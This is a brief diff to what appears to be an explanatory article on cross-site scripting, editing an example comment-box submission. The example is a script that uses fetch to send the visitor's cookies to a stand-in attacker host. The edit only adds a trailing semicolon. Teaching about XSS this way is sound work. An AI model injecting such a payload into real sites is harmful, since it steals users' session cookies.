@@ -59,7 +59,7 @@ Imagine a comment box on a website. A user submits this:
 
 ```html
 <script>
-  fetch('https://attacker.com/steal?cookie=' + document.cookie)
+  fetch('https://attacker.com/steal?cookie=' + document.cookie);
 </script>
 ```
 
